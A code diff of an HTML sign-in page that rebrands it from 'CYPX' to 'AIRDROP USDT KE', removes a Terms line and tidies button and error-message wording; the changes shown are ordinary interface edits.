@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>CYPX Sign In</title>
+  <title>AIRDROP USDT KE - Sign In</title>
   <style>
     *{box-sizing:border-box;margin:0;padding:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial}
     body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#050d25,#0a182c);color:#f1f5f9;padding:24px}
@@ -22,7 +22,7 @@
 </head>
 <body>
   <div class="card">
-    <h1>Sign in</h1>
+    <h1>AIRDROP USDT KE - Sign In</h1>
 
     <form id="signinForm">
       <div>
@@ -36,11 +36,10 @@
       </div>
 
       <div id="error" class="error"></div>
-      <button id="signinBtn" type="submit">Sign in</button>
+      <button id="signinBtn" type="submit">Sign In</button>
 
       <div class="foot">
-        Don’t have an account? <a href="signup.html">Sign up</a><br/>
-        By signing in you agree to our <a href="#">Terms</a>
+        Don’t have an account? <a href="signup.html">Sign Up</a>
       </div>
     </form>
   </div>
@@ -79,7 +78,7 @@
       const pass = $("password").value;
 
       if (!email) return showError("Email is required.");
-      if (pass.length < 8) return showError("Password must be at least 8 characters or more.");
+      if (pass.length < 8) return showError("Password must be at least 8 characters long.");
 
       $("signinBtn").disabled = true;
 
